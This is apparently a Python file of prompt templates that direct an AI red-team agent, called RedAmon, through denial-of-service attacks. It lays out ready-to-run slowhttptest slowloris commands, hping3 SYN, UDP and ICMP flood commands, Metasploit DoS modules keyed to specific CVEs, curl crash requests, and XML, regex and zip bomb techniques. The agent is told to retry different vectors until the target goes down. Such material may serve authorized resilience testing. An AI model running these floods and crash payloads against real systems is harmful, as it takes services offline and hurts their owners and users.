"""
RedAmon Denial of Service (DoS) Prompts

Prompts for DoS attack workflows including known CVE DoS, HTTP application DoS
(slowloris/slow POST), Layer 4 flooding, application logic DoS, and single-request crashes.
"""


# =============================================================================
# DENIAL OF SERVICE MAIN WORKFLOW
# =============================================================================

DOS_TOOLS = """
## ATTACK SKILL: DENIAL OF SERVICE (DoS)

**CRITICAL: This attack skill has been CLASSIFIED as Denial of Service.**
**You MUST use the DoS workflow below. Do NOT switch to other attack methods.**

---

## KEY RULE: NO POST-EXPLOITATION

DoS disrupts availability — it does NOT provide access.
NEVER request transition to post_exploitation.
Use action="complete" after verification.

---

## PRE-CONFIGURED SETTINGS (from project settings)

- **Max duration per attempt:** {dos_max_duration} seconds
- **Max vector attempts:** {dos_max_attempts}
- **Concurrent connections** (app-layer DoS): {dos_connections}
{dos_assessment_only_block}

---

## RETRY POLICY

**Maximum vector attempts: {dos_max_attempts}**

If a DoS vector fails, you MUST try DIFFERENT vectors up to {dos_max_attempts} times.
Each retry must use a DIFFERENT vector category (not the same tool with different flags).
Track attempts in your TODO list.

---

## MANDATORY DoS WORKFLOW

**Before starting: request `transition_phase` to exploitation.**
This unlocks DoS tools (metasploit_console, kali_shell for hping3/slowhttptest) and ensures findings are tracked correctly.

### Step 1: Select DoS Vector AND Tool

Based on informational phase intelligence, pick BOTH the technique AND the optimal tool.
Do NOT use a global tool priority — each vector has its own best tool. See the
**DoS VECTOR SELECTION GUIDE** below for the full vector → tool mapping with pre-checks,
commands, and verification steps.

### Step 2: Execute DoS Attack

Use the tool selected in Step 1. No global fallback chain — the tool
was chosen because it's the BEST for this specific vector.

### Step 3: Verify Impact

Use the DOS VERIFICATION GUIDE below to check if service is down.

### Step 4: Retry or Complete

- Service down → action="complete", report success with details (vector used, impact observed, duration)
- Service still up, attempts < {dos_max_attempts}:
  → Pick a DIFFERENT vector from the table in Step 1
    (different vector category = different tool, not same tool with different flags)
- Service still up, attempts >= {dos_max_attempts}:
  → action="complete", report service is resilient to tested vectors

---

## TROUBLESHOOTING

| Problem | Fix |
|---------|-----|
| MSF `search auxiliary/dos/<service>` returns nothing | Skip MSF, use kali_shell (hping3/slowhttptest) or execute_code instead |
| slowhttptest/hping3 runs but service still up | Pick a DIFFERENT vector from the table (different category, not just different flags) |
| Service recovers immediately after attack stops | Try sustained attack at max duration, or try Layer 4 flood instead of app-layer |
| Permission denied for raw sockets (hping3) | hping3 needs root — kali container runs as root, should work. If not, use execute_code with Python sockets |
| Same approach fails {dos_max_attempts}+ times | STOP. Report service is resilient to DoS with action="complete" |
"""


# =============================================================================
# DENIAL OF SERVICE VECTOR SELECTION GUIDE
# =============================================================================

DOS_VECTOR_SELECTION = """
## DoS VECTOR SELECTION GUIDE

Each row specifies the **best tool** for that vector — NOT a fallback chain.

---

### Known CVE DoS (Tool: `metasploit_console`)

| Service | Port | CVE/MS | MSF Module | Pre-check |
|---------|------|--------|-----------|-----------|
| RDP | 3389 | MS12-020 | `auxiliary/dos/windows/rdp/ms12_020_maxchannelids` | nmap `--script rdp-ms12-020` |
| HTTP/IIS | 80/443 | MS15-034 | `auxiliary/dos/http/ms15_034_ulonglongadd` | nmap `-sV` (IIS version) |
| HTTP/Apache | 80 | < 2.2.21 | `auxiliary/dos/http/apache_range_dos` | nmap `-sV` (Apache version) |
| HTTP/Apache | 80 | mod_isapi | `auxiliary/dos/http/apache_mod_isapi` | nmap `-sV` |
| SMB | 445 | Various | `auxiliary/dos/windows/smb/ms*` | nmap `-sV` |
| FTP | 21 | Various | `auxiliary/dos/ftp/*` | nmap `-sV` |
| DNS | 53 | Various | `auxiliary/dos/dns/*` | `dig @<target>` |
| SNMP | 161 | Various | `auxiliary/dos/snmp/*` | nmap `-sV` |
| HTTP (web fw) | 80/443 | Hash Collision | `auxiliary/dos/http/hashcollision_dos` | PHP/Java/Python web framework |
| Any | Any | Unknown | `search auxiliary/dos/<service>` | web_search for CVE |

---

### HTTP Application DoS (Tool: `kali_shell` → `slowhttptest`)

| Technique | Command | When to use |
|-----------|---------|------------|
| Slowloris (incomplete headers) | `slowhttptest -c {dos_connections} -H -g -o /tmp/dos_stats -i 10 -r 200 -t GET -l {dos_max_duration} -u http://<target>` | Default for any HTTP server |
| Slow POST body (R.U.D.Y.) | `slowhttptest -c {dos_connections} -B -g -o /tmp/dos_stats -i 110 -r 200 -t POST -l {dos_max_duration} -u http://<target>` | POST-heavy apps (forms, APIs) |
| Range header | `slowhttptest -c {dos_connections} -R -g -o /tmp/dos_stats -i 10 -r 200 -t GET -l {dos_max_duration} -u http://<target>` | Apache with Range support |

---

### Layer 4 Flooding (Tool: `kali_shell` → `hping3`)

| Protocol | Command | When to use |
|----------|---------|------------|
| TCP SYN Flood | `timeout {dos_max_duration} hping3 -S --flood -p <port> <target>` | Generic TCP service |
| UDP Flood | `timeout {dos_max_duration} hping3 --udp --flood -p <port> <target>` | DNS, SNMP, generic UDP |
| ICMP Flood | `timeout {dos_max_duration} hping3 --icmp --flood <target>` | Network-level disruption |

---

### Application Logic DoS (Tool: `execute_code`)

| Technique | Example |
|-----------|---------|
| ReDoS | Python: send regex-bomb input to vulnerable endpoint |
| XML Bomb | Python: POST `<!ENTITY>` billion laughs payload |
| GraphQL depth | Python: deeply nested GraphQL query |
| Zip bomb upload | Python: stream crafted compressed payload |
| Resource exhaustion | Python: expensive API calls in rapid succession |

---

### Single-Request Crash (Tool: `execute_curl`)

| Technique | Command |
|-----------|---------|
| Range header overflow | `curl -H "Range: bytes=0-18446744073709551615" http://<target>` |
| Malformed Content-Length | `curl -H "Content-Length: 999999999" -X POST http://<target>` |
| Header bomb | `curl -H "X-Custom: <10KB value>" http://<target>` |

"""


# =============================================================================
# DENIAL OF SERVICE VERIFICATION GUIDE
# =============================================================================

DOS_VERIFICATION_GUIDE = """
## DoS VERIFICATION GUIDE

After executing a DoS attack, verify impact using the appropriate method:

| Target Type | Tool | Command | "Down" = |
|------------|------|---------|----------|
| HTTP/HTTPS | execute_curl | `curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 <url>` | Timeout or 5xx |
| TCP port | execute_naabu | `-host <ip> -p <port> -json` | Port unreachable |
| Any service | execute_nmap | `-sV -p <port> --host-timeout 10s <target>` | "filtered" or timeout |
| DNS | kali_shell | `dig @<target> example.com +time=3` | Timeout |
| Recovery check | same tool | Re-run after 30s | Service returns |

**After verification:**
- Service DOWN → action="complete", report: vector used, impact, duration
- Service UP → retry with different vector (if attempts remain) or report resilient
"""
